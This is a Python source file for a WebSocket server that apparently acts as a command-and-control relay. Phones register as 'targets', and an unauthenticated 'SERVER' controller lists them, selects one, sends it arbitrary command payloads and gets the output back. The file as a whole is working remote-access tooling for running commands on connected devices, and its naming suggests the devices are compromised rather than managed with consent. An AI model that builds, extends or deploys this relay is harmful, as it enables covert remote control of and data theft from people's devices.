import os
import asyncio
import websockets
import json

connections = {}
server_count = 0

async def handle_connection(websocket, path=None):
    global server_count
    identity = None
    assigned_target = None
    
    try:
        handshake = await websocket.recv()
        handshake = handshake.strip()
        
        if handshake.upper().startswith("CLIENT"):
            # If the phone specified its hardware model name, extract it cleanly
            if ":" in handshake:
                identity = handshake.split(":", 1)[1]
            else:
                identity = f"Unknown_Device_{len(connections) + 1}"
                
            connections[identity] = websocket
            print(f"[+] Active target registered: {identity}")
            await websocket.wait_closed()
            
        elif handshake.upper() == "SERVER":
            server_count += 1
            identity = f"server{server_count}"
            print(f"[+] Controller authenticated: {identity}")
            
            async for message in websocket:
                try:
                    data = json.loads(message)
                    action = data.get("action")
                    
                    if action == "list":
                        # Send back all device names currently mapped into our socket dictionary
                        clients = list(connections.keys())
                        await websocket.send(json.dumps({"type": "menu", "data": clients}))
                        
                    elif action == "select":
                        target_name = data.get("target")
                        if target_name in connections:
                            assigned_target = target_name
                            await websocket.send(json.dumps({"type": "status", "data": f"Pinned routing link directly to {target_name}"}))
                        else:
                            await websocket.send(json.dumps({"type": "status", "data": "Target endpoint offline"}))
                            
                    elif action == "cmd":
                        payload = data.get("payload")
                        if assigned_target and assigned_target in connections:
                            await connections[assigned_target].send(payload)
                            response = await connections[assigned_target].recv()
                            await websocket.send(json.dumps({"type": "output", "data": response}))
                        else:
                            await websocket.send(json.dumps({"type": "status", "data": "Error: Command context missing unmapped target device"}))
                except Exception as e:
                    print(f"[-] Structural parse failure on server transaction: {e}")
                    
    except Exception as e:
        print(f"[-] Session lifecycle event noted for {identity}: {e}")
    finally:
        if identity in connections:
            del connections[identity]
            print(f"[-] Node removed from router table: {identity}")

async def main():
    port = int(os.environ.get("PORT", 5555))
    async with websockets.serve(handle_connection, "0.0.0.0", port, ping_interval=20, ping_timeout=20):
        print(f"[!] Multiplexed WebSocket Engine listening on port {port}...")
        await asyncio.Future()

if __name__ == "__main__":
    asyncio.run(main())
